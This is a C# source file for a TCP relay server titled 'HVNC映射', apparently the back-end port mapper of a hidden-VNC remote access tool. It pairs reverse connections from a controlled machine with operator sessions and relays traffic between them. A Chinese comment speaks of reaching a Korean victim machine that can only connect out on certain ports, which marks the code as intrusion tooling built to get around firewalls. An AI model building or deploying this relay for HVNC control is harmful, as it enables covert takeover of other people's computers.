using System;
using System.Collections.Generic;
using System.Net.Sockets;
using System.Threading;

namespace TCPServer_Socket
{
    class Program
    {
        public static Dictionary<int, TcpClient> dic = new Dictionary<int, TcpClient>();
        public static NetworkStream kongzhins = null;
        public static string serverport;
        public static string serverport_c;
        static void Main(string[] args)
        {
            Console.Title = "HVNC映射";
            serverport = args[0];
            serverport_c = args[1];
            ThreadPool.QueueUserWorkItem(new WaitCallback(start1));
            ThreadPool.QueueUserWorkItem(new WaitCallback(start2));
            WaitHandle.WaitAll(new ManualResetEvent[] { new ManualResetEvent(false) });
        }
        public static void start1(object obj)
        {
            TcpListener tl = new TcpListener(Convert.ToInt32(serverport));//开一个对方可以连接的端口，今天这棒子机器连他只能1433，其他连不上，他连别人只能80 8080 21   
            //原端口8080
            tl.Start();
            while (true)
            {
                TcpClient tc = tl.AcceptTcpClient();
                jieshou(tc);
            }
        }
        public static void start2(object obj)
        {
            TcpListener tl = new TcpListener(Convert.ToInt32(serverport_c));   
            tl.Start();
            Console.WriteLine("port1:" + Convert.ToInt32(serverport) + "||port2:" + Convert.ToInt32(serverport_c));
            while (true)
            {
                TcpClient tc = tl.AcceptTcpClient();
                Random rnd = new Random();
                int biaoji = rnd.Next(1000000000, 2000000000);
                dic.Add(biaoji, tc);
                byte[] bt = BitConverter.GetBytes(biaoji);
                try
                {
                    kongzhins.Write(bt, 0, bt.Length);
                }
                catch
                {
                    tc.Close();
                }
            }
        }
        public static void jieshou(TcpClient tc)
        {
            NetworkStream ns = tc.GetStream();
            byte[] bt = new byte[4];
            int count = ns.Read(bt, 0, bt.Length);
            if (count == 2 && bt[0] == 0x6f && bt[1] == 0x6b)
            {
                kongzhins = ns;
            }
            else
            {
                int biaoji = BitConverter.ToInt32(bt, 0);
                lianjie(biaoji, tc);
            }
        }
        public static void lianjie(int biaoji, TcpClient tc1)
        {
            TcpClient tc2 = null;
            if (dic.ContainsKey(biaoji))
            {
                dic.TryGetValue(biaoji, out tc2);
                dic.Remove(biaoji);
                tc1.SendTimeout = 300000;
                tc1.ReceiveTimeout = 300000;
                tc2.SendTimeout = 300000;
                tc2.ReceiveTimeout = 300000;
                object obj1 = (object)(new TcpClient[] { tc1, tc2 });
                object obj2 = (object)(new TcpClient[] { tc2, tc1 });
                ThreadPool.QueueUserWorkItem(new WaitCallback(transfer), obj1);
                ThreadPool.QueueUserWorkItem(new WaitCallback(transfer), obj2);
            }
        }
        public static void transfer(object obj)
        {
            TcpClient tc1 = ((TcpClient[])obj)[0];
            TcpClient tc2 = ((TcpClient[])obj)[1];
            NetworkStream ns1 = tc1.GetStream();
            NetworkStream ns2 = tc2.GetStream();
            while (true)
            {
                try
                {
                    byte[] bt = new byte[10240];
                    int count = ns1.Read(bt, 0, bt.Length);
                    ns2.Write(bt, 0, count);
                }
                catch
                {
                    ns1.Dispose();
                    ns2.Dispose();
                    tc1.Close();
                    tc2.Close();
                    break;
                }
            }
        }
    }
}
